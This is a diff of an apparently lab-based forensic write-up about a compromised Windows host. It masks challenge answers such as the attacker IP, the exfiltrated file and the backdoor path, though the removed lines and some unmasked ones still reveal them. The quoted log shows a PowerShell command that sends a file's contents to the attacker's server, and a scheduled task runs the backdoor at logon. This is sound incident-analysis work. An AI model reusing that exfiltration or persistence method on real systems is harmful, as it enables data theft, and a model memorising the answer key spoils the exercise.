@@ -20,12 +20,12 @@ The investigation revealed that an adversary gained initial footprint on the wor
 
 | \# | Question | Answer | 
 | ----- | ----- | ----- | 
-| **Q1** | What is the IP address of the attacker (IP)? | `192.168.31.132` | 
-| **Q2** | What is the full path of the file the attacker exfiltrated? | `C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt` | 
-| **Q3** | What is the exact content of the exfiltrated file? | `very_important_piece_of_information` | 
-| **Q4** | What is the full path of the installed backdoor? | `C:\Users\Immortal_ibr\Documents\update.exe` | 
-| **Q5** | What is the name of the malicious thing the attacker used for peresistance? | `Updater` | 
-| **Q6** | What is the Mitre technique that the attacker used in peresistance? | `T1053.005` | 
+| **Q1** | What is the IP address of the attacker (IP)? | `192.168.XX.XXX` | 
+| **Q2** | What is the full path of the file the attacker exfiltrated? | `C:\Users\Immortal_ibr\Desktop\Xxxxxxxxx xxxx\xxxxxx.txt` | 
+| **Q3** | What is the exact content of the exfiltrated file? | `very_xxxxxxxxx_xxxxx_xx_xxxxxxxxxxx` | 
+| **Q4** | What is the full path of the installed backdoor? | `C:\Users\Immortal_ibr\Xxxxxxxxx\xxxxxx.exe` | 
+| **Q5** | What is the name of the malicious thing the attacker used for peresistance? | `Xxxxxxx` | 
+| **Q6** | What is the Mitre technique that the attacker used in peresistance? | `Txxxx.xxx` | 
 | **Q7** | What is the trigger of the schedule task? | `LogonTrigger` | 
 
 ## 3. Forensic Environment & Tools
@@ -69,9 +69,9 @@ This indicates the host was potentially vulnerable to known remote buffer overfl
 
 Navigating to `Users\Immortal_ibr\Documents\` reveals a suspicious portable executable (PE) file:
 
-* **File Name:** `update.exe`
+* **File Name:** `xxxxxx.exe`
 
-* **Full Path:** `C:\Users\Immortal_ibr\Documents\update.exe`
+* **Full Path:** `C:\Users\Immortal_ibr\Documents\xxxxxx.exe`
 
 * **Size:** \~73 KB
 
@@ -94,7 +94,7 @@ Reveals an unregistered or non-standard scheduled task XML definition named **`U
   </Triggers>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\Immortal_ibr\Documents\update.exe</Command>
+      <Command>C:\Users\Immortal_ibr\Documents\xxxxxx.exe</Command>
     </Exec>
   </Actions>
 </Task>
@@ -103,11 +103,11 @@ Reveals an unregistered or non-standard scheduled task XML definition named **`U
 
 #### Analytical Findings:
 
-* **Backdoor Path:** `C:\Users\Immortal_ibr\Documents\update.exe`
+* **Backdoor Path:** `C:\Users\Immortal_ibr\Documents\xxxxxx.exe`
 
 * **Persistence Name:** `Updater`
 
-* **MITRE ATT&CK Technique:** `T1053.005` (Scheduled Task/Job: Scheduled Task)
+* **MITRE ATT&CK Technique:** `T1053.xxx` (Scheduled Task/Job: Scheduled Task)
 
 * **Trigger Type:** `LogonTrigger`
 
@@ -125,16 +125,16 @@ Error Message = The underlying connection was closed: An unexpected error occurr
 Fully Qualified Error ID = WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
 
 Context:
-    Host Application = powershell.exe Invoke-WebRequest https://192.168.31.132:8080/?ex=$(Get-Content C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt)
+    Host Application = powershell.exe Invoke-WebRequest https://192.168.xx.xxx:8080/?ex=$(Get-Content C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt)
     User = DESKTOP-MMN0N2M\Immortal_ibr
 
 ```
 
 #### Analytical Findings:
 
-1. **Attacker C2 / Exfiltration Endpoint:** `192.168.31.132` (listening on port `8080`).
+1. **Attacker C2 / Exfiltration Endpoint:** `192.168.xx.xxx` (listening on port `8080`).
 
-2. **Target File for Exfiltration:** `C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt`.
+2. **Target File for Exfiltration:** `C:\Users\Immortal_ibr\Desktop\Important docs\xxxxx.txt`.
 
 ### Phase 4: Recovering the Exfiltrated File via `$MFT` Carving (Q3)
 
